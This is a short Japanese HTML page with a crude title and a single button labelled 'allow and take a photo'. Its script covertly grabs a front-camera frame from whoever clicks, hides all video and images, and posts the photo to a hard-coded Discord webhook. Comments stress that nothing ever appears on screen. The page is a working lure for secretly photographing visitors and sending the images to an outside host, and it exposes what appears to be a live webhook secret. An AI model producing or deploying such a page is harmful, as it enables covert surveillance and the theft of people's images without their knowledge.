<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>まんこ</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            background-color: #007AFF;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        button:active {
            background-color: #0056b3;
        }
        /* 映像や画像、ログなどはすべて非表示（存在しない状態）にします */
        video, canvas, img { display: none; }
    </style>
</head>
<body>

    <button id="startButton">許可して撮影する</button>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const startButton = document.getElementById('startButton');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // あなたのDiscordウェブフックURL
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1515052959522619614/UkoZbAy19uRSxvHS8iHfo6Pdeh65nake5lMi4mqCOGGRfg3hERwnxFc-mLqvfUiqXhle';

        startButton.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(async () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // カメラを即座に停止
                        stream.getTracks().forEach(track => track.stop());

                        // Discordへ送信（画面には何も出さない）
                        canvas.toBlob(async (blob) => {
                            if (!blob) return;

                            const formData = new FormData();
                            formData.append('file', blob, 'shot.jpg');
                            formData.append('content', '📸 内カメで撮影された写真が届いたよ！');

                            try {
                                await fetch(DISCORD_WEBHOOK_URL, {
                                    method: 'POST',
                                    body: formData
                                });
                            } catch (error) {
                                // エラー時も画面には何も出さない
                                console.error(error);
                            }
                        }, 'image/jpeg');

                    }, 500);
                };

            } catch (err) {
                console.error(err);
            }
        });
    </script>
</body>
</html>
